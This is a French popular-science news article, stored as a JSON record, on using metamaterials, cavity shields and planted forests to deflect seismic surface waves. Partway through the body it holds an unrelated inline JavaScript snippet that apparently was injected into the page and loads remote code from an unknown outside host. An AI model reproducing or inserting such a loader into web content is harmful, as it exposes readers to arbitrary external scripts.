{"title": "Metamateriaux : des forets pour lutter contre les seismes", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2016-11-24", "content": "Ce mardi 19 septembre 2017, un puissant seisme a frappe le centre du Mexique, faisant plus de 200 morts et de nombreux degats materiels. Il y a moins d'un an, Futura presentait des travaux qui pourraient, a l'avenir, aider a proteger populations et constructions. Des structures se comportant comme des metamateriaux pourraient en effet servir a batir des boucliers antisismiques pour proteger nos villes et les centrales nucleaires des tremblements de terre. On pourrait meme utiliser pour cela des arbres convenablement plantes sous forme de forets, selon des chercheurs. Comment faire face aux catastrophes naturelles ?                       Chaque annee de nombreuses catastrophes naturelles ravagent les pays du Sud. Malheureusement, avec le peu de moyens disponibles, la gestion de ces etats de crise est souvent problematique. Sebastien Hardy, geographe de l'IRD (institut de Recherche pour le developpement) nous parle au cours de cette video des solutions envisagees par l'organisme pour traiter le probleme.                                       Article paru le 24 novembre 2016 Comme le prouve un article publie dans  Scientific Reports  par une equipe de chercheurs francais et britanniques, la possibilite d'utiliser des structures se comportant comme des  metamateriaux  vis-a-vis des  ondes elastiques  se porpageant dans un solide continue d'etre exploree. Avec des ondes lumineuses et les micro-ondes, les metamateriaux ont ouvert la  porte  a la realisation d'un vieux reve de l'humanite, l'invisibilite, en deviant la lumiere de facon appropriee. Physiciens et  mathematiciens  avaient montre il y a quelques annees qu'il est en theorie possible de devier de maniere semblable les  ondes sismiques  produites par les tremblements de  terre . De quoi, peut-etre, proteger des batiments, comme les  centrales nucleaires  du Japon, en les entourant d'un equivalent des boucliers d'invisibilite deja realises avec des micro-ondes. Pour obtenir ce resultat, il fallait notamment creuser des puits appropries dans le sol, comme nous l'avions explique precedemment (voir l'article au bas de celui-ci). Toutefois, en y regardant de plus pres, on remarque que la methode n'est pas sans defaut.  John William Strutt, plus connu sous son titre lord Rayleigh, etait un physicien anglais. Il est laureat du prix Nobel de physique de 1904. Il a conduit des travaux importants sur les ondes en physique. (c) DP, Wikipedia                        Des ondes de Rayleigh deviees par des arbres Les ondes deviees pour proteger un batiment peuvent detruire le voisin et, parmi les fameuses ondes sismiques en surface dite de Rayleigh bien connues des sismologues, certaines ont des  longueurs d'onde  suffisamment importantes pour ne pas etre affectees par les systemes d'invisibilite sismiques deja envisages. Heureusement, ces problemes semblent pouvoir etre surmontes en utilisant... des  arbres  !  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Des experiences menees en France avec une petite foret de pins non loin du campus de l'universite Joseph-Fourier a Grenoble, jointes a des  simulations numeriques , confirment en effet que les arbres peuvent se comporter comme des resonateurs reemettant des ondes de Rayleigh dans une certaine bande de frequences en reponse a l'arrivee de celles d'un  seisme . Au final, elles sont envoyees en profondeur dans le sol, et ce meme pour de grandes longueurs d'onde. Curieusement, la protection la plus efficace s'obtient avec des arbres plantes de facon dense et aleatoire. Elle s'ameliore encore en couvrant une plus grande bande de frequences si les arbres sont arranges avec des hauteurs decroissantes. Il y a pourtant un probleme : pour le moment, le concept ne fonctionne que si les ondes arrivent de deux directions seulement. Mais les chercheurs sont confiants. Ils finiront par faire sauter ce  verrou .  ---------- Seisme : quand les metamateriaux font bouclier (MAJ) Mise a jour publiee par  Laurent Sacco  le 16/09/2016 Des metamateriaux pourraient servir a batir des boucliers  antisismiques  pour proteger nos villes des tremblements de terre. Et ce, dans un futur pas si lointain, selon une equipe de chercheurs europeens. Les  tremblements de terre  sont parmi les  catastrophes naturelles  les plus meurtrieres. Et si les immeubles et autres habitations peuvent aujourd'hui etre batis pour resister aux seismes, il reste complique de proteger une ville entiere ou des constructions anciennes. Mais a en croire les travaux menes par une  equipe internationale de chercheurs europeens  (France, Italie, Royaume-Uni), des metamateriaux pourraient constituer des boucliers efficaces pour proteger nos villes des secousses sismiques. Le bouclier concu - a partir de  metamateriaux  localement resonants et de cristaux phononiques - par l'equipe se presente sous la forme de deux ou trois rangees de cavites entourant les structures a proteger. Une configuration qui permet d'attenuer les ondes sismiques - ou une partie d'entre elles -, qu'elles soient de surface ou de  volume . Les formes (en croix, en cylindre, etc.), les dimensions et les remplissages ( acier ,  beton ,  caoutchouc , etc.) de ces cavites dependent notamment du type de sol sur lequel est batie la structure. Ainsi par exemple, pour un sol fait essentiellement de  sable  et dans le cas d' ondes sismiques  de basse  frequence , les cavites devraient atteindre une profondeur de 10 metres. Elles devraient aussi etre associees a du beton pour eviter un  effondrement  des sols avoisinants. Mais pour passer de l'experimentation 3D - comme cela a ete le cas pour cette etude - a la realite, il reste encore des difficultes a contourner. Il faudra notamment trouver la configuration qui s'adaptera a des sols et des sous-sols non uniformes, composes de materiaux aux proprietes diverses. Et etendre les proprietes protectrices du bouclier a une gamme de longueurs d'onde encore plus large. Grace a un bouclier antisismique a base de metamateriaux et de cavites creusees dans le sol, des chercheurs europeens esperent limiter a l'avenir, les degats causes par les tremblements de terre a nos infrastructures. (c) Jianghaistudio, Shutterstock                               ---------- Article initial paru le 29/07/2009 Les etonnants concepts theoriques menant a ce que l'on appelle l'invisibilite pourraient aussi servir a proteger des batiments... contre les tremblements de terre. C'est ce que demontrent les chercheurs de l'institut Fresnel de Marseille, qui avaient deja propose ce principe contre les  tsunamis . Une idee qui pourrait aussi servir a reduire les  vibrations  d'une voiture. Un souffle prometheen traverse visiblement l'esprit de plusieurs Terriens depuis quelques semaines. Apres  Bill Gates et ses idees pour maitriser les cyclones , certains imaginent maintenant de controler la puissance destructrice des seismes. Ce sont les recentes proprietes des metamateriaux et les theories mathematiques decrivant la propagation des ondes a l'aide d' equations  aux derivees partielles qui inspirent un groupe de chercheurs travaillant aux universites d'Aix-Marseille et de Liverpool. Recemment, ces memes scientifiques avaient propose de  proteger les ports contre les tsunamis grace aux concepts theoriques de l'invisibilite . On peut en effet montrer par le calcul et a l'aide de simulations sur  ordinateur  que le trajet des ondes dans un milieu donne peut etre modifie de maniere a contourner un obstacle. Depuis quelques annees, les chercheurs de differents pays ont pu mettre en pratique ces predictions theoriques et realiser de veritables dispositifs d'invisibilite dans le domaine des micro-ondes. Aujourd'hui Mohamed Farhat, Sebastien Guenneau et Stefan Enoch viennent de publier le resultat de leurs recherches dans la revue  Physical Review Letters . En appliquant les memes concepts, de nouveau issus de la theorie de l'invisibilite, ils montrent que des series d'anneaux concentriques constitues de matiere  plastique , de  cuivre  et de quatre autres materiaux, differant par leurs  duretes  et leurs flexibilites, peuvent attenuer fortement les ondes sismiques en les deviant autour d'une construction a proteger. Les simulations des dispositifs imitant les metamateriaux, constitues d'anneaux concentriques, montrent qu'il est possible de se proteger des seismes en deviant les ondes sismiques. Credit : M. Farhat et al., PRL 103 (2009)                               Les geologues auront leur mot a dire Leur dispositif ne peut rien contre les ondes de  compression  (ou ondes P, suites de compressions et de decompressions du sol dans le sens de propagation) ni de cisaillement (ou ondes S, deformations laterales perpendiculaires a la propagation). En revanche, il peut effectivement attenuer le troisieme type d'ondes generees par un seisme, celles dites de surface. Or ces ondes, analogues aux rides a la surface de l'eau, sont justement celles qui ont les effets les plus destructeurs. La realisation pratique de dispositifs anti-sismiques devra cependant se plier aux contraintes issues de la  geologie  et les physiciens et mathematiciens devront tenir compte de l'avis des geologues. Des obstacles imprevus risquent donc d'etre decouverts et il est probablement encore trop tot pour savoir si les realisations seront a hauteur des esperances. D'autres  applications , probablement plus facilement realisables dans un premier temps, peuvent s'imaginer, dans l'industrie  automobile  et en aeronautique, ou des dispositifs similaires a ceux des chercheurs de l'Institut Fresnel pourraient supprimer les vibrations genantes. ", "theme": "sciences"}